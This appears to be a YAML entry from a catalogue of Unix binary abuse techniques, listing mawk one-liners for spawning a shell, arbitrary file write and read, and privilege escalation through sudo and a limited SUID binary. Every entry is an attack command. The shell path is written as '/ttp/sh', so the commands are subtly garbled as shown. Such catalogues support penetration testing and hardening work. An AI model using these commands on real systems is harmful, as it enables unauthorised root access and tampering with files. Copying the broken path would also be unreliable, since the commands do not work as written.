---
functions:
  shell:
    - code: mawk 'BEGIN {system("/ttp/sh")}'
  file-write:
    - code: |
        LFILE=file_to_write
        mawk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
  file-read:
    - code: |
        LFILE=file_to_read
        mawk '//' "$LFILE"
  sudo:
    - code: sudo mawk 'BEGIN {system("/ttp/sh")}'
  limited-suid:
    - code: ./mawk 'BEGIN {system("/ttp/sh")}'
---